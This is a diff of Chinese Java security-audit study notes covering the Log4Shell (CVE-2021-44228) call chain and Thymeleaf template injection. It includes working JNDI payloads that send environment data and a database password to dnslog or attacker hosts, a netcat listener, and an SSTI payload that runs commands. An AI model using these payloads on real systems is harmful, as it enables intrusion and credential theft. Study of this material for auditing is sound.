@@ -5722,6 +5722,8 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
 
 ### JNDI基础
 
+- sink：lookup
+
 - `JNDI(Java Naming and Directory Interface)`是Java提供的 `Java 命名和目录接口`。**通过调用JNDI的API应用程序可以定位资源和其他程序对象**。**感觉就是一个高层抽象，提供统一的接口来调用各种服务**。`JNDI`是 `Java EE`的重要部分，需要注意的是它并不只是包含了 `DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。
 
   - **Naming Service 命名服务：**
@@ -6199,23 +6201,616 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
 
 
 
-#### log4j2
+#### log4j
 
-- 参考资料：
+> panda师傅
+>
+> https://github.com/jas502n/Log4j2-CVE-2021-44228
 
-  - https://www.cnblogs.com/TJWater/p/15674995.html
-  - https://xz.aliyun.com/t/10649
-  - https://blog.csdn.net/hilaryfrank/article/details/122046180
+- 基础
+  - 2021 年 12 ⽉ 9 号,著名的Apache Log4j 项⽬被爆存在远程代码执⾏漏洞， 且利⽤简单，使用JNDI注入，影响危害巨⼤，光是引⼊了 log4j2 依赖的组件都是数不清，更别提项⽬本身可能存 在的⻛险了.
+  - 本质上还是和JNDI漏洞利用一样
+
 - 漏洞范围：
 
-  - 2.0——2.15.0 ：CVE-2021-44228
+  - 2.0—2.15.0 ：CVE-2021-44228
   - 2.15.0-rc1:
     - `PatternLayout.toSerializable`方法发生了变化,其中的 `formatters`属性的变化导致了 `${}`不会被处理。这样需要用户自己修改lookup的配置才能绕过。
       - 或者利用配置文件会解析用户的输入，走另外的函数。业务使用了ctx在日志规则中打印线程上下文中对应key，如：apiVersion,ctx中对应的key(如apiVersion)必须来自外部输入，且未做安全校验。
     - 同时最后 `JndiManager.lookup`触发漏洞的地方进行了修改，设置了host白名单。可通过url加空格，直接不进入这个函数。
   - 2.15.0-rc2：修复了利用在url加入空格的漏洞。需要业务的DSN被污染，能够将//127.0.0.1#evilhost.com:1389/a解析到evilhost.com域名下去
   - 2.16.0：默认关闭了Jndi
-  - 
+
+##### 2.0-2.15.0（CVE-2021-44228）
+
+- 根据官方[修复补丁](https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues)可以明确知道，是通过 jndi 中 LDAP 注⼊的⽅式实现了 RCE，然后查看其补丁的更改记录，可以发现对 lookup 函数进⾏了修改判断，知道了漏洞类型，那么就好⼊⼿了，⾸先翻阅官⽅⽂档中关于 [lookup](https://logging.apache.org/log4j/2.x/manual/lookups.html) 的说明：
+
+- 关于 JNDI lookup官⽅⽂档有说明：
+
+    - ```
+        Jndi Lookup
+        As of Log4j 2.17.0 JNDI operations require that log4j2.enableJndiLookup=true be set as a system property or the corresponding environment variable for this lookup to function. See the enableJndiLookup system property.
+        
+        The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a ":" no prefix will be added.
+        
+        The JNDI Lookup only supports the java protocol or no protocol (as shown in the example below).
+        
+        <File name="Application" fileName="application.log">
+          <PatternLayout>
+            <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
+          </PatternLayout>
+        </File>
+        Java's JNDI module is not available on Android.
+        ```
+
+- JndiLookup 允许通过 JNDI 检索变量，然后给了示例，使用格式
+
+    - ```
+        ${jndi:JNDIContent}
+        ```
+
+    - 既然明确了 lookup 是触发漏洞的点，并且找到了可以触发 lookup 的⽅法 ，那么就可以找⼊⼝ 点，只要找到⼊⼝点，然后传⼊ jndi 调⽤ ldap 的⽅式，就能够实现 RCE。 
+
+    - 那么，哪⼀个⼊⼝点可以传⼊ ${jndi:JNDIContent} 呢？
+
+    -  没错了，就是 LogManager.getLogger().xxxx() ⽅法 在log4j2中，共有8 个⽇志级别，可以通过 LogManager.getLogger() 调⽤记录⽇志的⽅法如 下：
+
+        - ```
+            LogManager.getLogger().error()
+            LogManager.getLogger().fatal()
+            LogManager.getLogger().trace()
+            LogManager.getLogger().traceExit()
+            LogManager.getLogger().traceEntry()
+            LogManager.getLogger().info()
+            LogManager.getLogger().warn()
+            LogManager.getLogger().debug()
+            LogManager.getLogger().log()
+            LogManager.getLogger().printf()
+            ```
+
+    - 上述列表中， error() 和 fatal() ⽅法可默认触发漏洞，其余的⽅法需要配置⽇志级别才可以触 发漏洞。因为在 logIfEnabled ⽅法中，对当前⽇志等级进⾏了⼀次判断：
+
+        - ```
+                @Override
+                public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final String message) {
+                    if (isEnabled(level, marker, message)) {
+                        logMessage(fqcn, level, marker, message);
+                    }
+                }
+            ```
+
+    - **只有当当前事件的⽇志等级⼤于等于设置的⽇志等级时，才会符合条件，进⼊ logMessage() ⽅法**
+
+        - ```java
+            public boolean isEnabled(final Level level, final Marker marker, final String message) {
+                    return privateConfig.filter(level, marker, message);
+            }
+                
+            boolean filter(final Level level, final Marker marker, final String msg) {
+                        final Filter filter = config.getFilter();
+                        if (filter != null) {
+                            final Filter.Result r = filter.filter(logger, level, marker, msg);
+                            if (r != Filter.Result.NEUTRAL) {
+                                return r == Filter.Result.ACCEPT;
+                            }
+                        }
+                        return level != null && intLevel >= level.intLevel();
+            
+            ```
+
+    - 项目设置log4的日志等级是在resources目录下的**log4j2.xml**配置文件中
+
+        - ```xml
+            <?xml version="1.0" encoding="UTF-8"?>
+            <Configuration status="WARN">
+                <Appenders>
+                    <Console name="Console" target="SYSTEM_OUT">
+                        <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
+                    </Console>
+                </Appenders>
+                <Loggers>
+                    <Root level="info">
+                        <AppenderRef ref="Console"/>
+                    </Root>
+                </Loggers>
+            </Configuration>
+            ```
+
+- 环境搭建
+
+    - ```
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>2.13.3</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>2.13.3</version>
+        </dependency>
+        ```
+
+    - ```java
+        
+        
+        ```
+
+- 分析一波调用链
+
+    - 断点下到Jndimanager#lookup方法
+
+        - ```
+            at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+            	  at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
+            	  at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor..........................................................
+            
+            ```
+
+    - 核心调用
+
+        - ```
+            at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+            	  at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
+            	  at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
+            	  at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
+            	  at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
+            	  at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
+            	  at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)
+            	  at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
+            	  at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
+            	  at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
+            	  at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
+            	  at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
+            	  at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
+            	  at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
+            	  at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
+            	  at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
+            	  at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
+            	  at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)
+            	  at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)
+            	  at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)
+            	  at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)
+            	  at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)
+            	  at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
+            ```
+
+    - ```
+            protected void log(final Level level, final Marker marker, final String fqcn, final StackTraceElement location,
+                final Message message, final Throwable throwable) {
+                final ReliabilityStrategy strategy = privateConfig.loggerConfig.getReliabilityStrategy();
+                if (strategy instanceof LocationAwareReliabilityStrategy) {
+                    ((LocationAwareReliabilityStrategy) strategy).log(this, getName(), fqcn, location, marker, level,
+                        message, throwable);
+                } else {
+                    strategy.log(this, getName(), fqcn, marker, level, message, throwable);
+                }
+            }
+        ```
+
+    - AwaitCompletionReliabilityStrategy.class#log方法会首先读取配置文件
+
+        - ```java
+                public void log(final Supplier<LoggerConfig> reconfigured, final String loggerName, final String fqcn,
+                    final StackTraceElement location, final Marker marker, final Level level, final Message data,
+                    final Throwable t) {
+                    final LoggerConfig config = getActiveLoggerConfig(reconfigured);
+                    try {
+                        config.log(loggerName, fqcn, location, marker, level, data, t);
+                    } finally {
+                        config.getReliabilityStrategy().afterLogEvent();
+                    }
+                }
+            ```
+
+    - 进入processLogEvent方法只会调用callAppenders方法
+
+        -  ```
+                 private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) {
+                     event.setIncludeLocation(isIncludeLocation());
+                     if (predicate.allow(this)) {
+                         callAppenders(event);
+                     }
+                     logParent(event, predicate);
+                 }
+             ```
+
+    - callAppenders方法判断配置文件中日志输出位置，一般是控制台以及输出到文件，这里只配置了控制台。
+
+        - ```
+                protected void callAppenders(final LogEvent event) {
+                    final AppenderControl[] controls = appenders.get();
+                    //noinspection ForLoopReplaceableByForEach
+                    for (int i = 0; i < controls.length; i++) {
+                        controls[i].callAppender(event);
+                    }
+                }
+            ```
+
+    - org.apache.logging.log4j.core.config.AppenderControl#callAppender会调用callAppenderPreventRecursion方法，主要是防止递归调用。
+
+        - ```
+                public void callAppender(final LogEvent event) {
+                    if (shouldSkip(event)) {
+                        return;
+                    }
+                    callAppenderPreventRecursion(event);
+                }
+                
+            ```
+
+    - 先进行防止递归调用，然后调用**callAppender0**方法
+
+        - ```java
+                private void callAppenderPreventRecursion(final LogEvent event) {
+                    try {
+                        recursive.set(this);
+                        callAppender0(event);
+                    } finally {
+                        recursive.set(null);
+                    }
+                }
+            ```
+
+    - callAppender0方法首先确保Appender启动，然后调用tryCallAppender
+
+        - ```
+                private void callAppender0(final LogEvent event) {
+                    ensureAppenderStarted();
+                    if (!isFilteredByAppender(event)) {
+                        tryCallAppender(event);
+                    }
+                }
+            ```
+
+    - tryCallAppender会追加改**event，其中包含log日志。**
+
+        - ```
+                private void tryCallAppender(final LogEvent event) {
+                    try {
+                        appender.append(event);
+                    ............................
+            ```
+
+    - AbstractOutputStreamAppender.class#append会调用tryAppend方法
+
+        - ```
+                public void append(final LogEvent event) {
+                    try {
+                        tryAppend(event);
+                    } catch (final AppenderLoggingException ex) {
+                        error("Unable to write to stream " + manager.getName() + " for appender " + getName(), event, ex);
+                        throw ex;
+                    }
+                }s
+            ```
+
+    - AbstractOutputStreamAppender.class#tryAppend方法会调用directEncodeEvent方法漏洞触发点
+
+        - ```
+                private void tryAppend(final LogEvent event) {
+                    if (Constants.ENABLE_DIRECT_ENCODERS) {   //默认为truee
+                        directEncodeEvent(event);
+                    } else {
+                        writeByteArrayToManager(event);
+                    }
+                }
+            ```
+
+    - AbstractOutputStreamAppender.class#directEncodeEvent 。Layout是配置文件写的格式，获取格式之后，会将poc用按照格式进行解码。
+
+        - ```java
+                protected void directEncodeEvent(final LogEvent event) {
+                    getLayout().encode(event, manager);
+                    if (this.immediateFlush || event.isEndOfBatch()) {
+                        manager.flush();
+                    }
+                }
+            ```
+
+    - org.apache.logging.log4j.core.layout.PatternLayout.class#encode会序列化，将**event**序列化
+
+        - ```
+                public void encode(final LogEvent event, final ByteBufferDestination destination) {
+                    if (!(eventSerializer instanceof Serializer2)) {
+                        super.encode(event, destination);
+                        return;
+                    }
+                    final StringBuilder text = toText((Serializer2) eventSerializer, event, getStringBuilder());
+                    final Encoder<StringBuilder> encoder = getStringBuilderEncoder();
+                    encoder.encode(text, destination);
+                    trimToMaxSize(text);
+                }
+            ```
+
+    - 进入toText方法直接调用序列化方法
+
+        - ```java
+                private StringBuilder toText(final Serializer2 serializer, final LogEvent event,
+                        final StringBuilder destination) {
+                    return serializer.toSerializable(event, destination);
+                }
+            ```
+
+    - this.formatters.length = 11 ，看堆栈发现是`org.apache.logging.log4j.core.pattern.MessagePatternConverter#format`的方法，可以发现是第九个
+
+        - ![image-20221105112434480](./java代码审计.assets/image-20221105112434480.png)
+
+    - 一直调用到MessagePatternConverter#format
+
+    - 一直调用到lookup#substitute
+
+        - 会递归解析`${}`表达式
+
+        - 开始使用prefixMatcher对象来匹配jndi字符。
+
+            - ![image-20221105113407774](./java代码审计.assets/image-20221105113407774.png)
+
+            - 以`${`开头
+
+        - 用suffixMathcer对象来匹配后缀
+
+            - ![image-20221105113539375](./java代码审计.assets/image-20221105113539375.png)
+
+            - 以`}`结尾
+
+    - 这里可以看出来为什么payload有**${}**字符串了，
+
+    - 进入replace方法跳转到StrSubstitutor.class#replace
+
+        - ```
+                public AbstractStringBuilder replace(int start, int end, String str) {
+                    if (start < 0)
+                        throw new StringIndexOutOfBoundsException(start);
+                    if (start > count)
+                        throw new StringIndexOutOfBoundsException("start > length()");
+                    if (start > end)
+                        throw new StringIndexOutOfBoundsException("start > end");
+            
+                    if (end > count)
+                        end = count;
+                    int len = str.length();
+                    int newCount = count + len - (end - start);
+                    ensureCapacityInternal(newCount);
+            
+                    System.arraycopy(value, end, value, start + len, count - end);
+                    str.getChars(value, start);
+                    count = newCount;
+                    return this;
+                }
+            ```
+
+        - 可以发现为什么有那么多畸形的payload
+
+    - 进入StrSubstitutor.class#resolveVariable执行lookup操作,传入给resolveVariable方法参数值可以发现恶意payload已经传进来了。
+
+        - ```
+                protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
+                                                 final int startPos, final int endPos) {
+                    final StrLookup resolver = getVariableResolver();
+                    if (resolver == null) {
+                        return null;
+                    }
+                    return resolver.lookup(event, variableName);
+                }
+            ```
+
+    - resolver中有一个strLookupMap，可以发现执行各种协议，以及自定义的lookup方法。
+
+        - ![image-20221105114048768](./java代码审计.assets/image-20221105114048768.png)
+
+    - 进入lookup方法到\org\apache\logging\log4j\core\lookup\Interpolator.class#lookup方法
+
+        - 进入lookup方法到\org\apache\logging\log4j\core\lookup\Interpolator.class#lookup方法，首先会判断**env:OS**字符串的前缀长度env。
+
+        - Map会获取对应的lookup类，如果是env就是EnvironmentLookup类，JNDI就是JndiLookup，最终会调用对应方法，
+
+        - ```java
+                public String lookup(final LogEvent event, String var) {
+                    if (var == null) {
+                        return null;
+                    }
+            
+                    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
+                    if (prefixPos >= 0) {
+                        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
+                        final String name = var.substring(prefixPos + 1);
+                        final StrLookup lookup = strLookupMap.get(prefix);
+                        if (lookup instanceof ConfigurationAware) {
+                            ((ConfigurationAware) lookup).setConfiguration(configuration);
+                        }
+                        String value = null;
+                        if (lookup != null) {
+                            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
+                        }
+            
+                        if (value != null) {
+                            return value;
+                        }
+                        var = var.substring(prefixPos + 1);
+                    }
+                    if (defaultLookup != null) {
+                        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
+                    }
+                    return null;
+                }
+            ```
+
+        -  取出`:`之前的字符，`strLookupMap.get(prefix)`,查找对应的StrLookup对象。JNDIlookup类会调用jndiManager#lookup方法
+
+            - ```
+                    public String lookup(final LogEvent event, final String key) {
+                        if (key == null) {
+                            return null;
+                        }
+                        final String jndiName = convertJndiName(key);
+                        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
+                            return Objects.toString(jndiManager.lookup(jndiName), null);
+                        } catch (final NamingException e) {
+                            LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
+                            return null;
+                        }
+                    }
+                ```
+
+        - 最终调用的是下面的lookup方法导致JNDI的RCE，Context类型是java.naming.context。Context类在jdk也是发起JNDI请求**“漏洞”**类。
+
+            - ```
+                  public <T> T lookup(String name) throws NamingException {
+                        return this.context.lookup(name);
+                    }
+                 
+              ```
+
+##### 使用了log4j2的产品
+
+- 
+
+##### 利用姿势
+
+> https://xz.aliyun.com/t/10659
+>
+> https://github.com/jas502n/Log4j2-CVE-2021-44228
+
+- 实战怎么找利用点
+    - 除了常见的header，还有就是配合被动扫描替换每个参数
+
+- dnslog确定用户名、操作系统以及Java的版本
+
+    - ```
+        ${jndi:ldap://${env:USERNAME}.${env:OS}.${sys:java.version}.dnslog.cn}
+        ```
+
+    - `DNS`协议是属于`JNDI`协议的，所以我们也可以利用`DNS`协议来带一些信息
+
+        - ```
+            ${jndi:dns://xxxxx:8090/${java:version}}
+            ```
+
+        - 在自己的`VPS`上`nc -luvvp 8090`即可收到信息
+
+- Sys和Env中包含着关键信息
+
+    - 信息来自于`System.getProperty()`和`System.getenv()`
+    - 具体能获取哪些信息可以参考某位师傅的仓库：https://github.com/jas502n/Log4j2-CVE-2021-44228
+
+- Bundle lookup获取数据库密码
+
+    - 条件：
+
+        - 这种情况**略显鸡肋**，需要手动排除`SpringBoot`自带的日志依赖并加入`Log4j2`的依赖（这种情况可能不多）
+
+        - ```xml
+            <dependency>
+                <groupId>org.springframework.boot</groupId>
+                <artifactId>spring-boot-starter</artifactId>
+                <exclusions>
+                    <exclusion>
+                        <groupId>org.springframework.boot</groupId>
+                        <artifactId>spring-boot-starter-logging</artifactId>
+                    </exclusion>
+                </exclusions>
+            </dependency>
+            <dependency>
+                <groupId>org.springframework.boot</groupId>
+                <artifactId>spring-boot-starter-log4j2</artifactId>
+            </dependency>
+            ```
+
+    - 通过`${bundle:application:spring.datasource.password}`可以直接拿到数据库密码
+
+    - 嵌入标签即可带到`Dnslog`
+
+- 不出网回显信息
+
+    - 这是一种报错回显，在`log`整体流程中有下面这样一部
+
+    - 在`tryCallAppender`方法中`catch`了`RuntimeException`
+
+        - ```
+            private void tryCallAppender(final LogEvent event) {
+                try {
+                    appender.append(event);
+                } catch (final RuntimeException error) {
+                    handleAppenderError(event, error);
+                } catch (final Exception error) {
+                    handleAppenderError(event, new AppenderLoggingException(error));
+                }
+            }
+            ```
+
+    - 如果配置了`ignoreExceptions`选项，就会直接抛出来
+
+        - ```
+            private void handleAppenderError(final LogEvent event, final RuntimeException ex) {
+                appender.getHandler().error(createErrorMsg("An exception occurred processing Appender "), event, ex);
+                if (!appender.ignoreExceptions()) {
+                    throw ex;
+                }
+            }
+            ```
+
+        - 在`log4j2.xml`中开启配置：`ignoreExceptions="false"`
+
+            - ```
+                <?xml version="1.0" encoding="UTF-8"?>
+                <Configuration status="warn" name="MyApp" packages="">
+                    <Appenders>
+                        <Console name="STDOUT" target="SYSTEM_OUT" ignoreExceptions="false">
+                            <PatternLayout pattern="%m%n"/>
+                        </Console>
+                    </Appenders>
+                    <Loggers>
+                        <Root level="error">
+                            <AppenderRef ref="STDOUT"/>
+                        </Root>
+                    </Loggers>
+                </Configuration>
+                ```
+
+        - **在实际的环境中，有开启这个配置的概率**，参考`apache`官方的描述大致意思是在`FailoverAppender`情况下必须设置该选项为`false`
+
+        - 某些情况下开发者想让错误报出来便于调试，也会故意开启这个选项
+
+    - 接下来就是制造`RuntimeException`
+
+        - 例如字符串转数字中有一个`NumberFormatException`异常，它父类的父类是`RuntimeException`
+
+            - ```
+                public class NumberFormatException extends IllegalArgumentException {}
+                public class IllegalArgumentException extends RuntimeException {}
+                ```
+
+    - `JndiManager.lookup`中`name`是`protocal://host:port/path`
+        - 其中`port`本该是`int`如果给它无法转`int`的字符串就会抛出这里的信息
+        - 又联想到`${}`是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果
+        - 根据这个思路，成功在`Tomcat`项目中回显执行结果（例如这里的`${java:version}`）
+    - 能够回显的`Payload`是这样：`${jndi:ldap://x.x.x.x:${java:version}/xxx}`
+
+**骚操作**
+
+- 利用4字节UTF-8字符触发Mysql报错，进而打印日志，触发log4j漏洞。https://mp.weixin.qq.com/s/mEwljigkkXk-y1ik7au_CQ
+    - 也就是说，如果在执行如下SQL时产生SQLException，并且用户名username携带了${jndi:ldap://x.x.x.x/exp}的话，即可完成log4j2漏洞的利用：
+    - 提到SQLException，最容易想到的就是数据库连接异常、报错注入。数据库连接不是用户可以控制的，至于报错注入，因为这里是用了预编译处理，很明显updatexml类的函数也没办法使用。
+    - 因为这里是普通的查询，尝试fuzz看看有什么思路：
+    - 发现当查询内容中包含emoji的时候，MySQL数据库会触发ERROR:
+    - 查阅了一下相关资料，主要是编码不统一的问题：
+        - https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-charsets.html
+        - https://segmentfault.com/q/1010000023488811
+    - 结合上面简单的分析尝试，直接在登录框使用emoji表情+poc进行登录：
+        - ![image-20221105122854458](./java代码审计.assets/image-20221105122854458.png)
+- 结合上述的案例，其实通过日志记录SqlException的情况还是蛮多的。除了特定场景下MySQL中利用emoji编码差异触发外，还可以结合具体情况来改进常规的log4j2检测poc，覆盖db2、Oracle等更多的场景，增加漏洞的检出率。
+
+##### 绕waf
+
+> https://github.com/woodpecker-appstore/log4j-payload-generator
 
 #### FastJson 反序列化JNDI注入示例：
 
@@ -7387,7 +7982,7 @@ public class Test {
                                 String accept = acceptList[i];
                                 if (className.startsWith(accept)) {
                                     clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
-                
+                    
                                     if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                         throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                                     }
@@ -7407,7 +8002,7 @@ public class Test {
                                 return TypeUtils.loadClass(typeName, defaultClassLoader);
                             }
                         }
-            
+                
                         for (int i = 0; i < denyList.length; ++i) {
                             String deny = denyList[i];
                             if (className.startsWith(deny)) {
@@ -7793,7 +8388,7 @@ public class Test {
 - ```json
     #报错：
     {"@type": "java.lang.AutoCloseable"
-    `["test":1]` 
+    ["test":1] 
     {
     
     #DNS
@@ -8159,9 +8754,293 @@ private static boolean isInnerIp(String url) throws URISyntaxException, UnknownH
 
 ### 4. SSTI
 
+#### Thymeleaf
+
+>  https://www.cnblogs.com/CoLo/p/15507738.html#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2
+
+Thymeleaf是SpringBoot中的一个模版引擎，以前会用jsp来做view层，后来jsp被淘汰了就是用模板，后面就前后端分离了。
+
+##### 基础知识
+
+- Thymeleaf中的表达式有好几种
+
+    - ```
+        变量表达式： ${...}
+        选择变量表达式： *{...}
+        消息表达： #{...}
+        链接 URL 表达式： @{...}
+        片段表达式： ~{...}
+        ```
+
+- 而这次遇到的是片段表达式(FragmentExpression)： `~{...}`，片段表达式可以用于引用公共的目标片段比如footer或者header
+
+    比如在`/WEB-INF/templates/footer.html`定义一个片段，名为copy。`<div th:fragment="copy">`
+
+    - ```xml
+        <!DOCTYPE html>
+        
+        <html xmlns:th="http://www.thymeleaf.org">
+        
+          <body>
+          
+            <div th:fragment="copy">
+              &copy; 2011 The Good Thymes Virtual Grocery
+            </div>
+          
+          </body>
+          
+        </html>
+        ```
+
+- 在另一template中引用该片段`<div th:insert="~{footer :: copy}"></div>`
+
+    - ```
+        <body>
+        
+          ...
+        
+          <div th:insert="~{footer :: copy}"></div>
+          
+        </body>
+        ```
+
+片段表达式语法
+
+- **`~{templatename::selector}`**，会在`/WEB-INF/templates/`目录下寻找名为`templatename`的模版中名字为`selector`作为`fragment`，如上面的`~{footer :: copy}`
+- **`~{templatename}`**，引用整个`templatename`模版文件作为`fragment`
+- **`~{::selector}` 或 `~{this::selector}`**，引用来自同一模版文件名为`selector`的`fragmnt`
+- 其中`selector`可以是通过`th:fragment`定义的片段，也可以是类选择器、ID选择器等。
+- **当`~{}`片段表达式中出现`::`，则`::`后需要有值，也就是`selector`。**
+
+**预处理：**
+
+- 语法：`__${expression}__`
+
+    - 官方文档对其的解释：
+        - 除了所有这些用于表达式处理的功能外，Thymeleaf 还具有*预处理*表达式的功能。
+        - **预处理是在正常表达式之前完成的表达式的执行**，允许修改最终将执行的表达式。
+        - 预处理的表达式与普通表达式完全一样，但被双下划线符号（如`__${expression}__`）包围。
+
+- **这是出现SSTI最关键的一个地方，预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的payload即可达到任意代码执行**
+
+- 源码分析的一些重点：
+
+    - `invokeForRequest`函数，根据用户输入的url，调用相关的controller，并将其返回值`returnValue`，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户。
+
+    - 重点是`returnValue`值是否为`null`，根据Controller写法不同会导致`returnValue`的值存在`null`和`非null`的情况。
+
+        - 不为null，return的字符串并根据前缀和后缀拼接起来，在templates目录下寻找模版文件
+
+        - 那如果Controller如下写的话，returnValue的值就会为null
+
+            - ```java
+                @GetMapping("/doc/{document}")
+                public void getDocument(@PathVariable String document) {
+                    log.info("Retrieving " + document);
+                    //returns void, so view name is taken from URI
+                }
+                ```
+
+        - 在applyDefaultViewName方法里面
+
+            - 如果ModelAndView值不为null则什么也不做，
+            - **否则如果`defaultViewName`存在值则会给ModelAndView赋值为defaultViewName，也就是将URI path作为视图名称**。
+
+    - 获取到`ModelAndView`值后会进入到`processDispatchResult`方法，第1个if会被跳过，跟进第2个if中的render方法
+
+    - 在`render`方法中，首先会获取mv对象的`viewName`，然后调用`resolveViewName`方法，`resolveViewName`方法最终会获取最匹配的视图解析器。
+
+    - 跟一下`resolveViewName`方法，这里涉及到两个方法：
+
+        - 首先通过`getCandidateViews`筛选出`resolveViewName`方法返回值不为null的视图解析器添加到`candidateViews`中; 
+        - 之后通过`getBestView`拿到最适配的解析器，getBestView中的逻辑是优先返回在`candidateViews`存在重定向动作的`view`，如果都不存在则根据请求头中的`Accept`字段的值与`candidateViews`的相关顺序，并判断是否兼容来返回最适配的`View`
+
+    - 最终返回的是`ThymeleafView`之后`ThymeleafView`调用了`render`方法，继续跟进
+
+    - 调用`renderFragmen`
+
+        - 这里是漏洞触发的关键点之一，该方法在后面首先判断**`viewTemplateName`是否包含`::`,**若包含则获取解析器,调用`parseExpression`方法将`viewTemplateName`(也就是Controller中最后**return的值)构造成片段表达式(`~{}`)并解析执行**，跟进`parseExpression`方法。
+
+    - 最终在org/thymeleaf/standard/expression/StandardExpressionParser对我们表达式进行解析，
+
+        - **首先在`preprocess`方法对表达式进行预处理（这里只要表达式正确就已经执行了我们payload中的命令**）并把结果存入`preprocessedInput`,可以看到此时预处理就已经执行了命令，
+        - 之后再次调用`parse`对预处理的结果`preprocessedInput`进行第二次解析，而第二次解析时，需要语法正确也就是在Thymeleaf中，**`~{}`中`::`需要有值才可以获得回显，否则没有回显。**
+
+    - 在org/thymeleaf/standard/expression/StandardExpressionPreprocessor#preprocess方法中，首先通过正则，将`__xxxx__`中间xxxx部分提取出来，调用execute执行
+
+    - 跟进execute最终调用org/thymeleaf/standard/expression/VariableExpression#executeVariableExpression使用SpEL执行表达式，触发任意代码执行
+
+最常见的一个payload
+
+- ```url
+    lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x`，
+    ```
+
+- 通过`__${}__::.x`构造表达式会由Thymeleaf去执行
+
+##### sink
+
+- 引入了Thymeleaf依赖。
+- controller，且不是`@ResponseBody` 或者 `@RestController`,而是返回视图
+
+变量由参数输入，然后会传递到`return`
+
+- 分为三种情况
+
+    - **templatename**
+
+        - ```java
+            @GetMapping("/path")
+            public String path(@RequestParam String lang) {
+                return "user/" + lang + "/welcome"; //template path is tainted
+            }
+            ```
+
+        - 变量传递到view层的路径当中
+
+        - ```java
+            Payload:
+            
+            lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x，
+            
+            这里因为最后return的值为
+            user/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x/welcome,
+            
+            无论我们payload如何构造最后都会拼接/welcome所以即使不加.x依然可以触发命令执行
+            ```
+
+    -  **selector**
+
